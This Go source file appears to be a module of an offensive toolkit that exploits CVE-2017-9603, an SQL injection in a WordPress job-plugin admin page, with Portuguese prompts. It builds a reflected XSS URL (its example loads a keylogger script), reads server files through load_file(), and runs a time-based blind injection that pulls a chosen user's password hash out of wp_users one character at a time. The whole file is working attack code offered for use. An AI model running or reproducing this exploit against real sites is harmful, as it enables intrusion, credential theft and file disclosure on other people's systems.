package modules

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

//CVE20179603 ...
func CVE20179603() {
	var url, payload, option string
	sqli := "/wp-admin/edit.php?post_type=job&page=WPJobsJobApps&jobid=5+AND+1%3D2+UNION+SELECT+NULL%2CNULL%2CNULL%2C"
	fmt.Printf("Url: ")
	fmt.Scanf("%s, ", &url)
	fmt.Printf("XSS/SQLI/FileRead\nModulo: ")
	fmt.Scanf("%s", &option)
	switch option {
	case "XSS":
		fmt.Println("Digite o payload (Reflect XSS). Ex: <script src='http://localhost:8080/keylogger.js'></script>")
		fmt.Printf("Payload: ")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		payload = scanner.Text()
		hxpayload := hex.EncodeToString([]byte(payload))

		url = url + sqli + "0x" + hxpayload + "%2CNULL%2CNULL--+"
		fmt.Println("Payload XSS\n" + url)
	case "FileRead":
		cookie := Login(url)
		fmt.Println("Esta opção é sujeita a erros")
		fmt.Printf("Arquivo: ")
		fmt.Scanf("%s", &payload)
		hxpayload := hex.EncodeToString([]byte(payload))
		client := new(http.Client)
		req, _ := http.NewRequest("GET", url+sqli+"load_file(0x"+hxpayload+")%2CNULL%2CNULL--+", nil)
		req.Header.Set("Cookie", cookie)
		resp, _ := client.Do(req)
		body, _ := ioutil.ReadAll(resp.Body)
		result := string(body)
		indOne := strings.Index(result, "Download Resume")
		indTwo := strings.Index(result, "No resume was attached")
		fmt.Println("\n" + result[indOne+146:indTwo-64])
	case "SQLI":
		cookie := Login(url)
		sqlInjection(cookie, url)
	}

}

func sqlInjection(cookie, url string) {
	var username string
	fmt.Printf("Esse modulo tentara extrair a hash da senha do usuario especificado\nUsuario: ")
	fmt.Scanf("%s", &username)
	fmt.Println("Start")
	i := 0
	count := 1
	hash := [65]string{"/", "$", ".", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"}
	client := &http.Client{}

	for i <= 64 {
		payload := "/wp-admin/edit.php?post_type=job&page=WPJobsJobApps&jobid=-1+UNION+SELECT+1%2C2%2C3%2C4%2C5%2Cif(mid((select+user_pass+from+wp_users+where+user_login%3d0x" + hex.EncodeToString([]byte(username)) + "+limit+1)," + strconv.Itoa(count) + ",1)%3d+BINARY+0x" + hex.EncodeToString([]byte(hash[i])) + ",sleep(5),1)--+-"
		deadline := time.Now().Add(5 * time.Second)
		urlf := url + payload
		req, _ := http.NewRequest("GET", urlf, nil)
		req.Header.Set("cookie", cookie)
		client.Do(req)
		if time.Now().After(deadline) {
			count++
			fmt.Printf("%s", hash[i])
			i = 0
		} else {
			i++
		}
	}
	fmt.Println("")
}
